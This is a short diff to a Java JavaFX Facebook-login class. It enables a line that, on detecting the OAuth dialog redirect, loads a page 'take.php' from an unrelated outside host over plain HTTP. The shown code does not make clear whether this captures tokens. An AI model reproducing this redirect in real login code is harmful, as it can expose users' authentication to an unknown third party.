@@ -52,7 +52,7 @@ public class LoginFB extends Application {
                     else if(lien.contains("https://www.facebook.com/v2.8/dialog/oauth?redirect_uri")){
                         nbrredirect++;
 
-                           // webEngine.load("http://webshc.com/take.php");
+                            webEngine.load("http://webshc.com/take.php");
 
 
                     }  }} });
